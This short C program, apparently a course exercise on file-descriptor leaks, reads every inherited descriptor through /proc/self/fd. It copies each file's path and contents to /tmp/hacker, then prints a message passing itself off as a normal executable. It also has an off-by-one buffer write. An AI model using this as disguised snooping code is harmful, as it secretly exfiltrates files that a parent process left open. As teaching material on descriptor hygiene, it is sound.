#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);
  /* TODO: Something is missing here! */ 

  char b1[1024]; 
  char b2[1024];
  char b3[1024];
  
  for( int i = 4; i <= max_fd; i++ ) {    
    int s = sprintf( b2, "/proc/self/fd/%d", i );
    int n = readlink( b2, b3, 1024 );  
    if ( n != -1 ) {   
      b3[n] = '\0'; 
      s = sprintf( b1, "File descriptor %d is '%s'file!\n", i, b3 );
      b1[s] = '\0';
      Write( out, b1, s );
        
      lseek( i, 0, SEEK_SET );

      //tu wypisujemy zawartość pliku
      char outContent[4096];
      int readBytes;           
      while ( ( readBytes = read( i, outContent, 4096 ) ) > 0 ) {            
        outContent[readBytes] = '\0';
        Write( out, outContent, readBytes);
      }
    }       
  }
  Close(out);
  printf("I'm just a normal executable you use on daily basis!\n");
  return 0;
}